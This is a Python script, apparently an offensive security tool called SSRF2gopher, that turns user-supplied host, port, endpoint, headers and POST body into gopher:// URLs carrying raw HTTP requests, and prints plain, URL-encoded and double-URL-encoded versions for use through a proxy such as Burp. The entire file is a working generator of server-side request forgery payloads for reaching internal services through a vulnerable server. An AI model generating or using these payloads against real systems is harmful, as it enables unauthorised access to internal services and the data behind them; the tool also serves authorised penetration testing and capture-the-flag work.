#!/usr/bin/python3
import urllib.parse
import argparse
import sys

def banner():
    banner = '''
   ___________  _______                 __          
  / __/ __/ _ \\/ __/_  |___ ____  ___  / /  ___ ____
 _\\ \\_\\ \\/ , _/ _// __// _ `/ _ \\/ _ \\/ _ \\/ -_) __/
/___/___/_/|_/_/ /____/\\_, /\\___/ .__/_//_/\\__/_/   
                      /___/    /_/                  

Created by eMVee 
    '''
    return banner

def url_encode_payload(data):
    encoded_data = data.replace(' ', '%20').replace('=', '%3d').replace('&', '%26')
    encoded_data = encoded_data.replace('\n', '%0a')
    return encoded_data

def double_url_encode_payload(data):
    encoded_data = data.replace(':', '%3a').replace('%20', '%2520')
    encoded_data = encoded_data.replace('%0a', '%250a')
    return encoded_data

def another_option(data):
    encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
    encoded_data = encoded_data.replace('%0a', '%250a')
    return encoded_data

def host_header(host):
    return "Host: " + host

def generate_gopher_request(host, port, endpoint, method, post_data=""):
    if method == "POST":
        return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"
    return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"

def generate_gopher_payload(host, port, endpoint, custom_headers, method, post_data=""):
    payload = generate_gopher_request(host, port, endpoint, method) + "\n"
    payload += host_header(host) + "\n"
    
    if method == "POST" and post_data:
        if "Content-Type" not in custom_headers:
            custom_headers["Content-Type"] = "application/x-www-form-urlencoded"
        if "Content-Length" not in custom_headers:
            custom_headers["Content-Length"] = str(len(post_data))

    for header, value in custom_headers.items():
        payload += f"{header}: {value}\n"
    
    payload += "\n"
    
    if method == "POST" and post_data:
        payload += post_data
        
    return payload

def parse_headers(headers_list):
    custom_headers = {}
    if headers_list:
        for header in headers_list:
            try:
                name, value = header.split(':', 1)
                custom_headers[name.strip()] = value.strip()
            except ValueError:
                print(f"[!] Invalid header format: {header}")
                print("Headers should be in the format 'Name:Value'")
                sys.exit(1)
    return custom_headers

def main():
    parser = argparse.ArgumentParser(description='Gopher payload generator with custom headers support')
    parser.add_argument('-u', '--host', help='Target host address')
    parser.add_argument('-p', '--port', help='Gopher port number')
    parser.add_argument('-e', '--endpoint', help='Target endpoint')
    parser.add_argument('-H', '--headers', nargs='*', help='Custom headers in format "Name:Value"')
    parser.add_argument('-m', '--method', help='HTTP method (GET, POST, PUT, etc.)')
    parser.add_argument('-d', '--data', help='POST data body parameters')
    
    args = parser.parse_args()

    print(banner())

    if args.host:
        host = args.host
    else:
        print("[?] What is the address of the Host? ")
        host = input()

    if args.port:
        port = args.port
    else:
        print("[?] What port should be used for gopher? ")
        port = input()

    if args.endpoint:
        endpoint = args.endpoint
    else:
        print("[?] What endpoint should be used for gopher? ")
        endpoint = input()

    if args.method:
        method = args.method.upper()
    else:
        print("[?] What HTTP method should be used? (GET, POST, PUT, etc.) ")
        method = input().upper()
        if not method:
            method = "GET"

    post_data = ""
    if method == "POST":
        if args.data:
            post_data = args.data
        else:
            print("[?] Enter POST data body parameters: ")
            post_data = input().strip()

    if args.headers:
        custom_headers = parse_headers(args.headers)
    else:
        custom_headers = {}
        print("[?] Would you like to add custom headers? (y/n)")
        if input().lower() == 'y':
            while True:
                print("[?] Enter header (or press enter to finish): ")
                user_input = input().strip()
                if not user_input:
                    break
                header, value = user_input.split(":")
                custom_headers[header.strip()] = value.strip()

    try:
        print("\n[!] Plain text payload:")
        print("\n")
        payload = generate_gopher_payload(host, port, endpoint, custom_headers, method, post_data)
        print(payload)

        encoded_payload = url_encode_payload(payload)
        print("\n[!] URL encoded payload:")
        print(encoded_payload)
        print("\n[!] Double URL encoded payload:")
        print(double_url_encode_payload(encoded_payload))
        print("\n[!] Another option that might work via something like BURP:")
        print(another_option(encoded_payload))

    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user. Exiting...")
        sys.exit(1)

if __name__ == "__main__":
    main()
